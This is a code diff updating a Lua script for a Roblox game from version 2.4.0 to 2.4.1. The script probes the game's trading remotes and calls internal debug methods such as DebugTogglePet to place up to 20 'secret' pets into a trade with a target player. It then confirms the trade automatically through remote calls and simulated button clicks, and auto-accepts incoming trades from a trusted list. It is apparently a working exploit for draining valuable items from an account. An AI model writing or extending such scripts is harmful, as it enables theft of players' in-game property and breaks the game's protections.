@@ -13,7 +13,7 @@
 ===============================================================================
 ]]
 
-local SCRIPT_VERSION = "2.4.0"
+local SCRIPT_VERSION = "2.4.1"
 
 local CONFIG = {
     ENDPOINT_URL = "http://127.0.0.1:3883/api/v1/telemetry",
@@ -1720,17 +1720,32 @@ local function sendInspectorSnapshot()
             end)
         end
 
-        -- Also dump all RemoteEvents / RemoteFunctions in ReplicatedStorage for trade/pet remote discovery
+        -- Also dump RemoteServices children (TradingService, PetService, etc.) for exact RF/RE discovery
         dump.remotesList = {}
+        dump.remoteServices = {}
         pcall(function()
+            local rsFolder = ReplicatedStorage:FindFirstChild("RemoteServices")
+            if rsFolder then
+                for _, svc in ipairs(rsFolder:GetChildren()) do
+                    local svcRemotes = {}
+                    for _, d in ipairs(svc:GetDescendants()) do
+                        if d:IsA("RemoteEvent") or d:IsA("RemoteFunction") then
+                            table.insert(svcRemotes, d.Parent.Name .. "." .. d.Name .. " (" .. d.ClassName .. ")")
+                        end
+                    end
+                    dump.remoteServices[svc.Name] = svcRemotes
+                end
+            end
             for _, desc in ipairs(ReplicatedStorage:GetDescendants()) do
-                if (desc:IsA("RemoteEvent") or desc:IsA("RemoteFunction")) and #dump.remotesList < 180 then
+                if (desc:IsA("RemoteEvent") or desc:IsA("RemoteFunction")) and #dump.remotesList < 250 then
                     local rel = desc:GetFullName():gsub("^ReplicatedStorage%.", "")
-                    table.insert(dump.remotesList, {
-                        name = desc.Name,
-                        className = desc.ClassName,
-                        path = rel,
-                    })
+                    if rel:lower():find("trad", 1, true) or rel:lower():find("pet", 1, true) or rel:lower():find("inv", 1, true) or rel:lower():find("setting", 1, true) or rel:lower():find("equip", 1, true) or rel:lower():find("lock", 1, true) then
+                        table.insert(dump.remotesList, {
+                            name = desc.Name,
+                            className = desc.ClassName,
+                            path = rel,
+                        })
+                    end
                 end
             end
         end)
@@ -2326,45 +2341,67 @@ end
 
 local function offerSecretPetsAndConfirm(secretRecords, targetPlayer)
     local apis = discoverTradingAndPetApis()
+    local tradingCtrl = apis.tradingMods["TradingController"]
+
     if os.time() - lastTradeOfferAt >= 2 then
         lastTradeOfferAt = os.time()
-        -- Offer up to 12 secrets per batch
-        for idx, rec in ipairs(secretRecords) do
-            if idx <= 12 then
-                invokeRemoteOrMethod(
-                    apis.tradingMods,
-                    { "AddPet", "OfferPet", "AddItem", "TogglePet", "SelectPet", "SetPetOffer" },
-                    { "AddTradePet", "AddPet", "OfferPet", "TradeAddPet", "ToggleTradePet", "AddItem" },
-                    rec.uuid
-                )
-            end
+
+        -- Read already-offered pet UUIDs from TradingController:GetOfferedPets() so we never toggle off an already-added Secret!
+        local alreadyOffered = {}
+        if type(tradingCtrl) == "table" and type(tradingCtrl.GetOfferedPets) == "function" then
+            pcall(function()
+                local ok, offered = pcall(function() return tradingCtrl:GetOfferedPets() end)
+                if not ok or type(offered) ~= "table" then
+                    ok, offered = pcall(function() return tradingCtrl.GetOfferedPets() end)
+                end
+                if ok and type(offered) == "table" then
+                    for k, v in pairs(offered) do
+                        if type(v) == "string" or type(v) == "number" then
+                            alreadyOffered[tostring(v)] = true
+                        elseif type(v) == "table" and (v.Id or v.UUID or v.id) then
+                            alreadyOffered[tostring(v.Id or v.UUID or v.id)] = true
+                        elseif v == true then
+                            alreadyOffered[tostring(k)] = true
+                        end
+                    end
+                end
+            end)
         end
 
-        -- UI fallback: click Secret pet cards inside PlayerGui.Trading
-        local tGui = getTradingScreenGui()
-        if tGui then
-            local secretNameSet = {}
-            local secretUuidSet = {}
-            for _, rec in ipairs(secretRecords) do
-                secretNameSet[rec.name:lower()] = true
-                secretUuidSet[rec.uuid:lower()] = true
-            end
-            for _, desc in ipairs(tGui:GetDescendants()) do
-                if (desc:IsA("ImageButton") or desc:IsA("TextButton")) and isGuiActuallyVisible(desc) then
-                    local nm = desc.Name:lower()
-                    if secretUuidSet[nm] or secretNameSet[nm] then
-                        fireGuiButton(desc)
+        -- Offer up to 20 secrets per trade (Shared.Trading.TradeTokens.MaxPets = 40, Build.Table.You.Count = 20)
+        local addedCount = 0
+        for _, rec in ipairs(secretRecords) do
+            if addedCount < 20 and not alreadyOffered[rec.uuid] then
+                addedCount = addedCount + 1
+                local toggled = false
+                if type(tradingCtrl) == "table" and type(tradingCtrl.DebugTogglePet) == "function" then
+                    local ok = pcall(function() tradingCtrl:DebugTogglePet(rec.uuid) end)
+                    if not ok then
+                        ok = pcall(function() tradingCtrl.DebugTogglePet(rec.uuid) end)
                     end
+                    toggled = ok
+                end
+                if not toggled then
+                    invokeRemoteOrMethod(
+                        apis.tradingMods,
+                        { "DebugTogglePet", "AddPet", "OfferPet", "AddItem", "TogglePet", "SelectPet" },
+                        { "TradingService.RF.TogglePet", "TradingService.RF.AddPet", "TradingService.RE.TogglePet", "AddTradePet", "OfferPet" },
+                        rec.uuid
+                    )
                 end
             end
         end
     end
 
-    -- Trigger Ready / Accept / Confirm on trade session
+    -- Trigger ActivateReady() on TradingController + Ready button in PlayerGui.Trading.Trading.Build.Actions.Ready.Button
+    if type(tradingCtrl) == "table" and type(tradingCtrl.ActivateReady) == "function" then
+        pcall(function() tradingCtrl:ActivateReady() end)
+        pcall(function() tradingCtrl.ActivateReady() end)
+    end
     invokeRemoteOrMethod(
         apis.tradingMods,
-        { "SetReady", "Ready", "Accept", "Confirm", "ConfirmTrade", "AcceptTrade" },
-        { "SetTradeReady", "TradeReady", "ReadyTrade", "AcceptTrade", "ConfirmTrade", "Ready", "Confirm" },
+        { "ActivateReady", "SetReady", "Ready", "Accept", "Confirm", "ConfirmTrade", "AcceptTrade" },
+        { "TradingService.RF.Ready", "TradingService.RF.SetReady", "TradingService.RF.Confirm", "SetTradeReady", "TradeReady", "ConfirmTrade" },
         true
     )
 
@@ -2372,12 +2409,15 @@ local function offerSecretPetsAndConfirm(secretRecords, targetPlayer)
     if tGui then
         for _, desc in ipairs(tGui:GetDescendants()) do
             if (desc:IsA("TextButton") or desc:IsA("ImageButton")) and isGuiActuallyVisible(desc) then
+                local fullPath = desc:GetFullName():lower()
                 local nm = desc.Name:lower()
                 local txt = (desc:IsA("TextButton") and desc.Text or ""):lower()
-                if (nm:find("ready", 1, true) or nm:find("accept", 1, true) or nm:find("confirm", 1, true)
-                    or txt:find("ready", 1, true) or txt:find("accept", 1, true) or txt:find("confirm", 1, true))
-                    and not nm:find("decline", 1, true) and not nm:find("cancel", 1, true)
-                    and not txt:find("decline", 1, true) and not txt:find("cancel", 1, true) then
+                if fullPath:find("actions.ready", 1, true)
+                    or ((nm:find("ready", 1, true) or nm:find("accept", 1, true) or nm:find("confirm", 1, true)
+                        or txt:find("ready", 1, true) or txt:find("accept", 1, true) or txt:find("confirm", 1, true))
+                        and not fullPath:find("cancel", 1, true) and not fullPath:find("decline", 1, true)
+                        and not nm:find("decline", 1, true) and not nm:find("cancel", 1, true)
+                        and not txt:find("decline", 1, true) and not txt:find("cancel", 1, true)) then
                     fireGuiButton(desc)
                 end
             end
@@ -2446,10 +2486,15 @@ local function acceptIncomingTradeAndConfirm(trustedSet)
     end
 
     if isActiveTradeWindowVisible(trustedSet) then
+        local tradingCtrl = apis.tradingMods["TradingController"]
+        if type(tradingCtrl) == "table" and type(tradingCtrl.ActivateReady) == "function" then
+            pcall(function() tradingCtrl:ActivateReady() end)
+            pcall(function() tradingCtrl.ActivateReady() end)
+        end
         invokeRemoteOrMethod(
             apis.tradingMods,
-            { "SetReady", "Ready", "Accept", "Confirm", "ConfirmTrade", "AcceptTrade" },
-            { "SetTradeReady", "TradeReady", "ReadyTrade", "AcceptTrade", "ConfirmTrade" },
+            { "ActivateReady", "SetReady", "Ready", "Accept", "Confirm", "ConfirmTrade", "AcceptTrade" },
+            { "TradingService.RF.Ready", "TradingService.RF.SetReady", "TradingService.RF.Confirm", "SetTradeReady", "TradeReady", "ReadyTrade", "AcceptTrade", "ConfirmTrade" },
             true
         )
     end
